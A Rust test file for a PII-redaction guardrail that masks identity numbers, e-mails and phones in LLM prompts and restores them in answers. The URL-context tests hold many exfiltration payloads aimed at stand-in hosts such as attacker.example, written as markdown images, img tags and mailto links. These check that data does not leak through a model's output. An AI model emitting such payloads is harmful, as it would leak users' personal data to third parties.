//! Response-side restoration on the LiteLLM Generic Guardrail API
//! (`POST /beta/litellm_basic_guardrail_api` with
//! [`ApiState::with_litellm_restore`]): the request side numbers its
//! placeholders and stores the vault under the LiteLLM call id, the
//! response side (one call, or every `incremental_diff` streaming round)
//! restores the originals. Sessions are bound to LiteLLM-generated call ids
//! and to the LiteLLM key hash, bounded, and never answer a request-side
//! call with an original.
#![cfg(feature = "api")]

use std::time::Duration;

use redactify::api::{handle_request_with, serve_with, ApiState, RestoreLimits, RestoreSessions};
use serde_json::{json, Value};

const PATH: &str = "/beta/litellm_basic_guardrail_api";
const TCKN: &str = "12345678950";
const EMAIL: &str = "ali.veli@example.com";
const CALL: &str = "5fb567a8-e153-4c65-987a-6cfa3fe4942d";
const KEY_HASH: &str = "88dc28d0f030c55ed4ab77ed8faf098196cb1c05df778539800c9f1243fe6b4b";

fn restoring() -> ApiState {
    ApiState::default().with_litellm_restore(RestoreSessions::default())
}

fn with_limits(limits: RestoreLimits) -> ApiState {
    ApiState::default().with_litellm_restore(RestoreSessions::new(limits))
}

/// A body as LiteLLM v1.110.2 sends it: the call id, the key hash in
/// `request_data`, the sanitized inbound headers.
fn body(input_type: &str, texts: &[&str], call_id: &str) -> Value {
    json!({
        "texts": texts,
        "input_type": input_type,
        "litellm_call_id": call_id,
        "litellm_trace_id": "0e95ad4c-eecb-4a05-8e1e-57a0af79b6b5",
        "request_data": { "user_api_key_hash": KEY_HASH, "user_api_key_user_id": "default_user_id" },
        "request_headers": { "content-type": "application/json", "authorization": "[present]" },
        "litellm_version": "1.110.2",
    })
}

fn send(state: &ApiState, body: &Value) -> (u16, Value) {
    let r = handle_request_with(state, "POST", PATH, &body.to_string());
    (r.status, serde_json::from_str(&r.body).expect("JSON body"))
}

/// The texts LiteLLM ends up with: the returned ones, or its own on NONE.
fn texts_after(sent: &[&str], v: &Value) -> Vec<String> {
    match v["action"].as_str() {
        Some("GUARDRAIL_INTERVENED") => v["texts"]
            .as_array()
            .expect("texts")
            .iter()
            .map(|t| t.as_str().expect("string").to_owned())
            .collect(),
        Some("NONE") => sent.iter().map(|&t| t.to_owned()).collect(),
        other => panic!("unexpected action {other:?}: {v}"),
    }
}

fn request(state: &ApiState, texts: &[&str], call_id: &str) -> Vec<String> {
    let (status, v) = send(state, &body("request", texts, call_id));
    assert_eq!(status, 200, "{v}");
    texts_after(texts, &v)
}

fn response(state: &ApiState, texts: &[&str], call_id: &str) -> Vec<String> {
    let (status, v) = send(state, &body("response", texts, call_id));
    assert_eq!(status, 200, "{v}");
    texts_after(texts, &v)
}

#[test]
fn a_call_round_trips_its_originals() {
    let state = restoring();
    let prompt = format!("My TCKN is {TCKN} and my e-mail is {EMAIL}. Again: {TCKN}.");
    let masked = request(&state, &[&prompt], CALL);
    assert_eq!(
        masked[0],
        "My TCKN is [TCKN_1] and my e-mail is [EMAIL_1]. Again: [TCKN_1]."
    );
    // what the model answers, echoing the placeholders
    let answer = format!("upstream received: {}", masked[0]);
    let restored = response(&state, &[&answer], CALL);
    assert_eq!(restored[0], format!("upstream received: {prompt}"));
}

#[test]
fn restoration_is_off_by_default_and_restore_true_is_refused() {
    let state = ApiState::default();
    let masked = request(&state, &[&format!("TCKN {TCKN}")], CALL);
    assert_eq!(
        masked[0], "TCKN [TCKN]",
        "labels, not numbered placeholders"
    );
    let restored = response(&state, &["the TCKN is [TCKN_1]"], CALL);
    assert_eq!(restored[0], "the TCKN is [TCKN_1]");

    let mut b = body("request", &["hi"], CALL);
    b["additional_provider_specific_params"] = json!({ "restore": true });
    let (status, v) = send(&state, &b);
    assert_eq!(status, 400, "{v}");
    assert_eq!(v["error"]["code"], "bad_provider_params");

    b["additional_provider_specific_params"] = json!({ "restore": "yes" });
    let (status, _) = send(&restoring(), &b);
    assert_eq!(status, 400);
}

#[test]
fn a_guardrail_can_opt_out() {
    let state = restoring();
    let mut b = body("request", &[&format!("TCKN {TCKN}")], CALL);
    b["additional_provider_specific_params"] = json!({ "restore": false });
    let (_, v) = send(&state, &b);
    assert_eq!(v["texts"][0], "TCKN [TCKN]");
    assert!(state.litellm_restore.as_ref().unwrap().is_empty());
}

#[test]
fn a_client_chosen_call_id_gets_no_session() {
    // a LiteLLM client can set `x-litellm-call-id`; LiteLLM forwards it in
    // request_headers. Such an id may be another call's: no session.
    let state = restoring();
    for header in ["x-litellm-call-id", "X-LiteLLM-Call-Id"] {
        let mut b = body("request", &[&format!("TCKN {TCKN}")], CALL);
        b["request_headers"][header] = json!(CALL);
        let (_, v) = send(&state, &b);
        assert_eq!(v["texts"][0], "TCKN [TCKN]", "{header}");
    }
    assert!(state.litellm_restore.as_ref().unwrap().is_empty());

    // and an attacker who replays a victim's call id on the response side
    // (a post_call-only guardrail, client-chosen id) gets placeholders
    request(&state, &[&format!("TCKN {TCKN}")], CALL);
    let mut b = body("response", &["[TCKN_1]"], CALL);
    b["request_headers"]["x-litellm-call-id"] = json!(CALL);
    let (_, v) = send(&state, &b);
    assert_eq!(v["action"], "NONE", "{v}");
}

#[test]
fn calls_without_request_headers_or_a_usable_id_get_no_session() {
    let state = restoring();
    let mut b = body("request", &[&format!("TCKN {TCKN}")], CALL);
    b.as_object_mut().unwrap().remove("request_headers");
    assert_eq!(send(&state, &b).1["texts"][0], "TCKN [TCKN]");
    for id in [
        json!(null),
        json!(""),
        json!("x".repeat(129)),
        json!("bad\nid"),
    ] {
        let mut b = body("request", &[&format!("TCKN {TCKN}")], CALL);
        b["litellm_call_id"] = id.clone();
        assert_eq!(send(&state, &b).1["texts"][0], "TCKN [TCKN]", "{id}");
    }
    assert!(state.litellm_restore.as_ref().unwrap().is_empty());
}

#[test]
fn sessions_are_isolated_by_call_id_and_key_hash() {
    let state = restoring();
    request(&state, &[&format!("TCKN {TCKN}")], CALL);
    // another call id
    let other = response(
        &state,
        &["[TCKN_1]"],
        "11111111-2222-4333-8444-555555555555",
    );
    assert_eq!(other[0], "[TCKN_1]");
    // the same call id under another LiteLLM key
    let mut b = body("response", &["[TCKN_1]"], CALL);
    b["request_data"]["user_api_key_hash"] = json!("another-key-hash");
    assert_eq!(send(&state, &b).1["action"], "NONE");
    // the right pair restores
    assert_eq!(response(&state, &["[TCKN_1]"], CALL)[0], TCKN);
}

#[test]
fn the_request_side_never_returns_an_original() {
    let state = restoring();
    request(&state, &[&format!("TCKN {TCKN}")], CALL);
    // a later request-side call of the same call carrying the placeholder
    // (a retry, a second pre_call guardrail) is masked, never restored
    let again = request(&state, &["repeat [TCKN_1] please"], CALL);
    assert_eq!(again[0], "repeat [TCKN_1] please");
    assert!(!again[0].contains(TCKN));
}

#[test]
fn placeholders_the_client_wrote_are_never_reused() {
    let state = restoring();
    let masked = request(
        &state,
        &[&format!("literal [TCKN_1] and value {TCKN}")],
        CALL,
    );
    assert_eq!(masked[0], "literal [TCKN_1] and value [TCKN_2]");
    let restored = response(&state, &["[TCKN_1] / [TCKN_2]"], CALL);
    assert_eq!(restored[0], format!("[TCKN_1] / {TCKN}"));
}

#[test]
fn pseudonym_shaped_text_the_client_wrote_is_left_alone() {
    // the internal masking style renders `[TYPE#<16 hex>]`; such text in
    // the input is the client's own and passes through verbatim
    let state = restoring();
    let input = format!("ref [TCKN#0123456789abcdef] and TCKN {TCKN}");
    let masked = request(&state, &[&input], CALL);
    assert_eq!(masked[0], "ref [TCKN#0123456789abcdef] and TCKN [TCKN_1]");
}

#[test]
fn numbering_spans_every_text_of_the_call_and_repeats_are_stable() {
    let state = restoring();
    let texts = [
        format!("system: customer {EMAIL}"),
        format!("user: TCKN {TCKN}, mail {EMAIL}"),
        "user: other mail veli@example.org".to_owned(),
    ];
    let refs: Vec<&str> = texts.iter().map(String::as_str).collect();
    let masked = request(&state, &refs, CALL);
    assert_eq!(masked[0], "system: customer [EMAIL_1]");
    assert_eq!(masked[1], "user: TCKN [TCKN_1], mail [EMAIL_1]");
    assert_eq!(masked[2], "user: other mail [EMAIL_2]");
    // a repeated request-side call (LiteLLM retries on a fresh connection)
    // gets the same placeholders
    assert_eq!(request(&state, &refs, CALL), masked);
    let restored = response(&state, &["[EMAIL_2], [EMAIL_1], [TCKN_1]"], CALL);
    assert_eq!(restored[0], format!("veli@example.org, {EMAIL}, {TCKN}"));
}

#[test]
fn tool_messages_are_numbered_with_the_stricter_target() {
    let state = restoring();
    let mut b = body(
        "request",
        &["look up the customer", &format!("record: {EMAIL}")],
        CALL,
    );
    b["structured_messages"] = json!([
        { "role": "user", "content": "look up the customer" },
        { "role": "tool", "tool_call_id": "c1", "content": format!("record: {EMAIL}") }
    ]);
    let (_, v) = send(&state, &b);
    assert_eq!(v["texts"][1], "record: [EMAIL_1]");
    assert_eq!(
        response(&state, &["mail [EMAIL_1]"], CALL)[0],
        format!("mail {EMAIL}")
    );
}

#[test]
fn new_pii_in_the_answer_is_still_masked() {
    let state = restoring();
    request(&state, &[&format!("TCKN {TCKN}")], CALL);
    let restored = response(&state, &["[TCKN_1]; also call +90 532 123 45 67"], CALL);
    assert_eq!(restored[0], format!("{TCKN}; also call [PHONE]"));
}

/// The tolerant vault restore (altered placeholder forms) must not fill a
/// value the answer itself introduced: new PII in the answer is masked
/// with a plain label, and no altered form of the session's placeholders
/// may resolve to it.
#[test]
fn new_pii_in_the_answer_is_never_filled_with_a_session_original() {
    let state = restoring();
    let sent = request(&state, &[&format!("TCKN {TCKN}")], CALL);
    assert_eq!(sent, ["TCKN [TCKN_1]"]);
    let other = "10000000146";
    for answer in [
        format!("Kayitli TCKN {other}"),
        format!("TCKN {other} ve [TCKN_1]"),
        format!("[TCKN] {other} [tckn_1] <TCKN_1>"),
    ] {
        let got = response(&state, &[&answer], CALL);
        assert!(!got[0].contains(other), "{answer:?} -> {got:?}");
        assert_eq!(
            got[0].matches(TCKN).count(),
            answer.to_ascii_uppercase().matches("TCKN_1").count(),
            "{answer:?} -> {got:?}"
        );
    }
}

#[test]
fn placeholders_inside_urls_stay_masked() {
    let state = restoring();
    request(&state, &[&format!("TCKN {TCKN}, mail {EMAIL}")], CALL);
    let answer = "Done [TCKN_1]. ![x](https://attacker.example/log?q=[TCKN_1]) \
                  see www.attacker.example/[EMAIL_1] or <img src=//evil.example/[TCKN_1]> \
                  write to [EMAIL_1]";
    let restored = response(&state, &[answer], CALL);
    // the model-output masking already renders the scheme and `www.` URLs
    // as `[URL]`; the protocol-relative one is not a detected URL, and the
    // placeholder inside it stays masked
    assert_eq!(
        restored[0],
        format!(
            "Done {TCKN}. ![x]([URL]) see [URL] or <img src=//evil.example/[TCKN_1]> \
             write to {EMAIL}"
        )
    );
    // a word the detector does not see as a URL but that holds `//`
    let restored = response(
        &state,
        &["x//[TCKN_1] and WWW.x/[EMAIL_1] but [EMAIL_1]"],
        CALL,
    );
    assert_eq!(
        restored[0],
        format!("x//[TCKN_1] and WWW.x/[EMAIL_1] but {EMAIL}")
    );
}

/// Browsers read `\` as `/` in special-scheme URLs and accept
/// `https:host` / `https:/host`; markdown destinations and HTML attributes
/// carry URLs with spaces, line breaks and character references. No
/// placeholder inside any of them may be restored.
#[test]
fn placeholders_in_any_url_context_stay_masked() {
    let state = restoring();
    request(&state, &[&format!("TCKN {TCKN}, mail {EMAIL}")], CALL);
    let answers = [
        r#"<img src="\\attacker.example\x?[TCKN_1]">"#,
        r"![](https:\\attacker.example\?q=[TCKN_1])",
        "https:attacker.example/?q=[TCKN_1]",
        "https:/attacker.example/?q=[TCKN_1]",
        "HTTPS:\\\\ATTACKER.EXAMPLE\\[EMAIL_1]",
        r"\\attacker.example\[TCKN_1]",
        "![](https:attacker.example/?q=[TCKN_1])",
        "![](https:/attacker.example/?q=[TCKN_1])",
        r#"<img src="https:attacker.example/x?[TCKN_1]">"#,
        "![](<https://attacker.example/?q= [TCKN_1]>)",
        "![a](https://attacker.example/?q=\n[TCKN_1])",
        "[click](mailto:x@attacker.example?body=[TCKN_1])",
        r"![](HTTPS:\\ATTACKER.EXAMPLE\[EMAIL_1])",
        "![](https://attacker.example/?q=TCKN_1)",
        r"![](\\attacker.example\[TCKN_1])",
        "<img alt=\">\" src=\"&#104;ttps:attacker.example/?q=[TCKN_1]\">",
        "<img\nsrc=\"https://attacker.example/?q=\n[TCKN_1]\">",
        "<a href=' //attacker.example/[TCKN_1]'>x</a>",
        "![](\t//attacker.example/[TCKN_1])",
        "[x]: https:attacker.example/?q=[TCKN_1]",
        "see https&colon;//attacker.example/?q=[TCKN_1] now",
        "![]( https://attacker.example/?q=<TCKN_1> )",
    ];
    for answer in answers {
        let restored = response(&state, &[answer], CALL);
        assert!(
            !restored[0].contains(TCKN) && !restored[0].contains(EMAIL),
            "{answer:?} -> {:?}",
            restored[0]
        );
    }
    // outside a URL context every accepted rendering is restored
    let restored = response(
        &state,
        &["Kayıt [TCKN_1], <EMAIL_1> ve TCKN_1; ![logo](/x.png) [TCKN_1]."],
        CALL,
    );
    assert_eq!(
        restored[0],
        format!("Kayıt {TCKN}, {EMAIL} ve {TCKN}; ![logo](/x.png) {TCKN}.")
    );
}

/// Numbers whose placeholder appears in the request in ANY shape the
/// tolerant restore accepts are never issued, so the answer's copy of that
/// text is never filled with a value.
#[test]
fn placeholder_shapes_the_client_wrote_are_never_filled() {
    let state = restoring();
    let prompt = format!(
        "Şablon alanı <TCKN_1> ve TCKN_1 olarak kalsın, [tckn_01] ve [KİMLİK_1] de; benim TCKN {TCKN}"
    );
    let masked = request(&state, &[&prompt], CALL);
    assert!(!masked[0].contains(TCKN), "{}", masked[0]);
    assert!(
        masked[0].starts_with("Şablon alanı <TCKN_1> ve TCKN_1 olarak kalsın, [tckn_01]"),
        "{}",
        masked[0]
    );
    assert!(!masked[0].ends_with("[TCKN_1]"), "{}", masked[0]);
    // the model echoes the prompt: the client gets it back as written
    let restored = response(&state, &[&masked[0]], CALL);
    assert_eq!(restored[0], prompt);
}

/// The vault's round-trip exemptions survive in the session (it is not
/// rebuilt from entries): a prompt whose own text is an altered rendering
/// after pseudonymization comes back as the client wrote it.
#[test]
fn an_echoed_prompt_comes_back_byte_exact() {
    let state = restoring();
    for prompt in [
        format!("Kimlik [{TCKN}] ve {{{EMAIL}}}"),
        format!("Numaram {TCKN}'e kayıtlı, e-posta {EMAIL}'ya"),
        format!("&lt;{TCKN}&gt; ve <{EMAIL}>"),
    ] {
        let call = format!("{CALL}-{}", prompt.len());
        let masked = request(&state, &[&prompt], &call);
        assert!(!masked[0].contains(TCKN), "{}", masked[0]);
        let restored = response(&state, &[&masked[0]], &call);
        assert_eq!(restored[0], prompt, "masked {:?}", masked[0]);
    }
}

const PHONE: &str = "+90 532 123 45 67";

/// The vault keeps a bare `PHONE_1` in code (a fenced block, an inline
/// span) as written, tracking the code context from the start of the
/// answer. The endpoint restores the whole answer in one pass, so that
/// context survives the split at the last line break and protected URL
/// ranges.
#[test]
fn code_context_survives_the_line_split_and_protected_ranges() {
    let state = restoring();
    let masked = request(&state, &[&format!("telefon {PHONE}")], CALL);
    assert_eq!(masked[0], "telefon [PHONE_1]");
    let cases = [
        // the answer ends inside a fence: its last line is judged as code
        (
            "```python\nx = 1\nprint(PHONE_1)".to_owned(),
            "```python\nx = 1\nprint(PHONE_1)".to_owned(),
        ),
        // an inline span opened by a backtick inside a protected word
        (
            "`a//b PHONE_1` and PHONE_1".to_owned(),
            format!("`a//b PHONE_1` and {PHONE}"),
        ),
        // a fence opened before a protected line
        (
            "```\nhttps:x/y\nprint(PHONE_1)\n```\nAra PHONE_1".to_owned(),
            format!("```\nhttps:x/y\nprint(PHONE_1)\n```\nAra {PHONE}"),
        ),
        // brackets are restored in prose and kept in code alike
        (
            "Ara [PHONE_1]\n```\nPHONE_1\n".to_owned(),
            format!("Ara {PHONE}\n```\nPHONE_1\n"),
        ),
    ];
    for (answer, expected) in cases {
        let restored = response(&state, &[&answer], CALL);
        assert_eq!(restored[0], expected, "{answer:?}");
    }
}

#[test]
fn code_context_survives_streamed_rounds() {
    let model = "Kod:\n```python\nx = 1\nprint(PHONE_1)\n```\nAra PHONE_1, `PHONE_1` değil.\n";
    let expected =
        format!("Kod:\n```python\nx = 1\nprint(PHONE_1)\n```\nAra {PHONE}, `PHONE_1` değil.\n");
    for size in 1..=7 {
        for rate in [1, 2, 5] {
            let state = restoring();
            request(&state, &[&format!("telefon {PHONE}")], CALL);
            let chunks = chunked(model, size);
            let refs: Vec<&str> = chunks.iter().map(String::as_str).collect();
            let (client, _) = stream(&state, &refs, rate)
                .unwrap_or_else(|e| panic!("size {size} rate {rate}: {e}"));
            assert_eq!(client, expected, "size {size} rate {rate}");
        }
    }
}

#[test]
fn a_blocked_answer_ends_the_session() {
    let state = restoring();
    request(&state, &[&format!("TCKN {TCKN}")], CALL);
    let (_, v) = send(
        &state,
        &body("response", &["[TCKN_1] key AKIAIOSFODNN7EXAMPLE"], CALL),
    );
    assert_eq!(v["action"], "BLOCKED", "{v}");
    assert!(state.litellm_restore.as_ref().unwrap().is_empty());
    assert_eq!(response(&state, &["[TCKN_1]"], CALL)[0], "[TCKN_1]");
}

#[test]
fn client_rules_never_split_a_placeholder() {
    let state = restoring();
    // `[A-Z]{4}` would match the `TCKN` inside `[TCKN_1]`
    let rule = json!({ "patterns": [{ "pattern": "[A-Z]{4}" }] });
    let mut b = body("request", &[&format!("TCKN {TCKN} code ABCD")], CALL);
    b["additional_provider_specific_params"] = rule.clone();
    let (_, v) = send(&state, &b);
    assert_eq!(
        v["texts"][0], "[CUSTOM_PATTERN] [TCKN_1] code [CUSTOM_PATTERN]",
        "{v}"
    );
    let mut b = body("response", &["[TCKN_1] and WXYZ"], CALL);
    b["additional_provider_specific_params"] = rule;
    let (_, v) = send(&state, &b);
    assert_eq!(v["texts"][0], format!("{TCKN} and [CUSTOM_PATTERN]"), "{v}");
}

#[test]
fn a_full_table_or_vault_falls_back_to_labels() {
    let state = with_limits(RestoreLimits {
        max_sessions: 1,
        ..RestoreLimits::default()
    });
    assert_eq!(
        request(&state, &[&format!("TCKN {TCKN}")], CALL)[0],
        "TCKN [TCKN_1]"
    );
    let second = "99999999-2222-4333-8444-555555555555";
    assert_eq!(
        request(&state, &[&format!("TCKN {TCKN}")], second)[0],
        "TCKN [TCKN]"
    );
    assert_eq!(response(&state, &["[TCKN_1]"], second)[0], "[TCKN_1]");

    let state = with_limits(RestoreLimits {
        max_entries: 1,
        ..RestoreLimits::default()
    });
    let masked = request(&state, &[&format!("TCKN {TCKN}, mail {EMAIL}")], CALL);
    assert_eq!(masked[0], "TCKN [TCKN_1], mail [EMAIL]");

    let state = with_limits(RestoreLimits {
        max_bytes: 8,
        ..RestoreLimits::default()
    });
    let masked = request(&state, &[&format!("TCKN {TCKN}")], CALL);
    assert_eq!(masked[0], "TCKN [TCKN]");
    assert!(state.litellm_restore.as_ref().unwrap().is_empty());
}

#[test]
fn sessions_expire_and_can_be_ended() {
    let state = with_limits(RestoreLimits {
        idle_timeout: Duration::ZERO,
        ..RestoreLimits::default()
    });
    request(&state, &[&format!("TCKN {TCKN}")], CALL);
    std::thread::sleep(Duration::from_millis(5));
    assert_eq!(response(&state, &["[TCKN_1]"], CALL)[0], "[TCKN_1]");

    // after the first response-side call, the shorter linger applies
    let state = with_limits(RestoreLimits {
        linger_after_response: Duration::ZERO,
        ..RestoreLimits::default()
    });
    request(&state, &[&format!("TCKN {TCKN}")], CALL);
    assert_eq!(response(&state, &["[TCKN_1]"], CALL)[0], TCKN);
    std::thread::sleep(Duration::from_millis(5));
    assert_eq!(response(&state, &["[TCKN_1]"], CALL)[0], "[TCKN_1]");
    let sessions = state.litellm_restore.as_ref().unwrap();
    assert_eq!(sessions.sweep() + sessions.len(), 0);

    let state = restoring();
    request(&state, &[&format!("TCKN {TCKN}")], CALL);
    let sessions = state.litellm_restore.as_ref().unwrap();
    assert!(!sessions.end(CALL, Some("another-key-hash")));
    assert!(sessions.end(CALL, Some(KEY_HASH)));
    assert_eq!(response(&state, &["[TCKN_1]"], CALL)[0], "[TCKN_1]");
    request(&state, &[&format!("TCKN {TCKN}")], CALL);
    sessions.clear();
    assert!(sessions.is_empty());
}

#[test]
fn debug_output_shows_no_ids_or_values() {
    let state = restoring();
    request(&state, &[&format!("TCKN {TCKN}")], CALL);
    let dbg = format!("{state:?}");
    assert!(dbg.contains("RestoreSessions"), "{dbg}");
    assert!(!dbg.contains(TCKN) && !dbg.contains(CALL), "{dbg}");
}

#[test]
fn the_socket_server_refuses_restoration_without_a_token() {
    if std::env::var_os("REDACTIFY_API_TOKEN").is_some() {
        return; // the environment supplies a token
    }
    let e = serve_with("127.0.0.1:0", restoring()).expect_err("must refuse to start");
    assert!(e.to_string().contains("bearer token"), "{e}");
}

// ---- streaming: LiteLLM's incremental_diff, simulated exactly ----

/// LiteLLM v1.110.2 `streaming_transform_mode: incremental_diff`
/// (`unified_guardrail.py` `_run_incremental_transform_stream` and
/// `_build_transform_chunk`): the raw accumulated text is sent every
/// `rate` chunks and once at the end; the client receives the returned
/// text past what it already received, minus the holdback (0 on the final
/// round). A returned text that does not extend what was sent is a
/// `stream_transform_underflow`. Lengths are Python `str` lengths (code
/// points). Returns the client text and every delta.
fn stream(state: &ApiState, chunks: &[&str], rate: usize) -> Result<(String, Vec<String>), String> {
    let mut acc = String::new();
    let mut emitted: Vec<char> = Vec::new();
    let mut deltas = Vec::new();
    let mut round = |acc: &str, is_final: bool| -> Result<(), String> {
        let (status, v) = send(state, &body("response", &[acc], CALL));
        if status != 200 || v["action"] == "BLOCKED" {
            return Err(format!("round failed: {v}"));
        }
        let returned: Vec<char> = texts_after(&[acc], &v)[0].chars().collect();
        let holdback = if is_final {
            0
        } else {
            v["stream_holdback_chars"][0].as_u64().unwrap_or(0) as usize
        };
        if !returned.starts_with(&emitted) {
            return Err(format!(
                "stream_transform_underflow: emitted {:?}, returned {:?}",
                emitted.iter().collect::<String>(),
                returned.iter().collect::<String>()
            ));
        }
        let end = emitted.len().max(returned.len().saturating_sub(holdback));
        let delta: String = returned[emitted.len()..end].iter().collect();
        emitted.extend(delta.chars());
        if !delta.is_empty() {
            deltas.push(delta);
        }
        Ok(())
    };
    for (k, c) in chunks.iter().enumerate() {
        acc.push_str(c);
        if (k + 1) % rate == 0 && k + 1 != chunks.len() {
            round(&acc, false)?;
        }
    }
    round(&acc, true)?;
    Ok((emitted.into_iter().collect(), deltas))
}

fn chunked(text: &str, size: usize) -> Vec<String> {
    let chars: Vec<char> = text.chars().collect();
    chars.chunks(size).map(|c| c.iter().collect()).collect()
}

#[test]
fn a_stream_is_restored_whatever_the_chunking() {
    let model = "Kaydınız: TCKN [TCKN_1]\nE-posta [EMAIL_1] doğru mu?\n\
                 Bağlantı x//y/[TCKN_1] ve [TCKN_1].";
    let expected = format!(
        "Kaydınız: TCKN {TCKN}\nE-posta {EMAIL} doğru mu?\n\
         Bağlantı x//y/[TCKN_1] ve {TCKN}."
    );
    for size in 1..=7 {
        for rate in 1..=5 {
            let state = restoring();
            request(&state, &[&format!("TCKN {TCKN} mail {EMAIL}")], CALL);
            let chunks = chunked(model, size);
            let refs: Vec<&str> = chunks.iter().map(String::as_str).collect();
            let (client, deltas) = stream(&state, &refs, rate)
                .unwrap_or_else(|e| panic!("size {size} rate {rate}: {e}"));
            assert_eq!(client, expected, "size {size} rate {rate}");
            for d in &deltas {
                // no delta ever ends inside a placeholder
                if let Some(open) = d.rfind('[') {
                    assert!(d[open..].contains(']'), "{d:?}");
                }
            }
        }
    }
}

#[test]
fn a_stream_without_a_session_still_streams_masked() {
    let state = restoring();
    let model = "TCKN [TCKN_1]\nphone +90 532 123 45 67\nend";
    let chunks = chunked(model, 3);
    let refs: Vec<&str> = chunks.iter().map(String::as_str).collect();
    let (client, _) = stream(&state, &refs, 5).expect("no underflow");
    assert_eq!(client, "TCKN [TCKN_1]\nphone [PHONE]\nend");
}

// ---- measurements (run alone, in release) ----

#[cfg(target_os = "linux")]
fn rss_kib() -> usize {
    let status = std::fs::read_to_string("/proc/self/status").unwrap();
    status
        .lines()
        .find_map(|l| l.strip_prefix("VmRSS:"))
        .and_then(|v| v.trim().trim_end_matches("kB").trim().parse().ok())
        .unwrap()
}

/// Memory per session as resident-set growth: 4096 sessions with 1, 4, 16
/// and 64 values, before and after a response-side restore (which builds
/// and keeps the vault's token automaton). `cargo test --release --features
/// api --test api_litellm_restore -- --ignored --nocapture measure_memory`.
#[cfg(target_os = "linux")]
#[test]
#[ignore = "measurement: prints numbers, run alone in release"]
fn measure_memory_per_session() {
    const SESSIONS: usize = 4096;
    // every table stays alive: memory freed by an earlier round would be
    // reused by the allocator and hide the growth of the next one
    let mut alive = Vec::new();
    for values in [1usize, 4, 16, 64, 256] {
        let state = with_limits(RestoreLimits {
            max_sessions: SESSIONS,
            max_entries: 1024,
            max_bytes: 1 << 20,
            ..RestoreLimits::default()
        });
        let prompt: String = (0..values)
            .map(|i| format!("mail user{i:03}@example.com; "))
            .collect();
        let answer: String = (1..=values).map(|i| format!("[EMAIL_{i}] ")).collect();
        let ids: Vec<String> = (0..SESSIONS)
            .map(|s| format!("5fb567a8-e153-4c65-987a-{s:012}"))
            .collect();
        let before = rss_kib();
        for id in &ids {
            request(&state, &[&prompt], id);
        }
        let stored = rss_kib();
        for id in &ids {
            let r = response(&state, &[&answer], id);
            assert!(r[0].contains("user000@example.com"));
        }
        let restored = rss_kib();
        assert_eq!(state.litellm_restore.as_ref().unwrap().len(), SESSIONS);
        println!(
            "{SESSIONS} sessions x {values} values ({} prompt bytes): {:.0} bytes/session stored, \
             {:.0} bytes/session after a restore",
            prompt.len(),
            (stored.saturating_sub(before) * 1024) as f64 / SESSIONS as f64,
            (restored.saturating_sub(before) * 1024) as f64 / SESSIONS as f64,
        );
        alive.push(state);
    }
}

/// Per-call latency of the endpoint with and without restoration, request
/// and response side (alternating, median of N).
#[test]
#[ignore = "measurement: prints numbers, run alone in release"]
fn measure_call_latency() {
    use std::time::Instant;
    const N: usize = 2000;
    let unit = format!(
        "Customer Ali Veli (TCKN {TCKN}) asked about invoice 4411; reply to {EMAIL} or call \
         +90 532 123 45 67. IBAN TR33 0006 1005 1978 6457 8413 26 was used. "
    );
    let text: String = unit.repeat(8).chars().take(1000).collect();
    let clean: String = "The weather in Ankara is mild this week and the meeting moved to Friday. "
        .repeat(14)
        .chars()
        .take(1000)
        .collect();
    let plain = ApiState::default();
    let restore = restoring();
    let masked_answer = request(&restore, &[&text], CALL)[0].clone();
    let median = |mut xs: Vec<f64>| {
        xs.sort_by(f64::total_cmp);
        xs[xs.len() / 2]
    };
    for (label, input) in [("1 KB with PII", &text), ("1 KB clean", &clean)] {
        let (mut a, mut b) = (Vec::with_capacity(N), Vec::with_capacity(N));
        for i in 0..N {
            let id = format!("5fb567a8-e153-4c65-987a-{i:012}");
            let t = Instant::now();
            request(&plain, &[input], &id);
            a.push(t.elapsed().as_secs_f64() * 1e3);
            let t = Instant::now();
            request(&restore, &[input], &id);
            b.push(t.elapsed().as_secs_f64() * 1e3);
            restore.litellm_restore.as_ref().unwrap().clear();
        }
        println!(
            "request side, {label}: p50 {:.3} ms off, {:.3} ms with restoration",
            median(a),
            median(b)
        );
    }
    request(&restore, &[&text], CALL);
    let (mut a, mut b) = (Vec::with_capacity(N), Vec::with_capacity(N));
    for _ in 0..N {
        let t = Instant::now();
        response(&plain, &[&masked_answer], CALL);
        a.push(t.elapsed().as_secs_f64() * 1e3);
        let t = Instant::now();
        let r = response(&restore, &[&masked_answer], CALL);
        b.push(t.elapsed().as_secs_f64() * 1e3);
        assert!(r[0].contains(TCKN));
    }
    println!(
        "response side, 1 KB answer: p50 {:.3} ms off, {:.3} ms with restoration",
        median(a),
        median(b)
    );
}
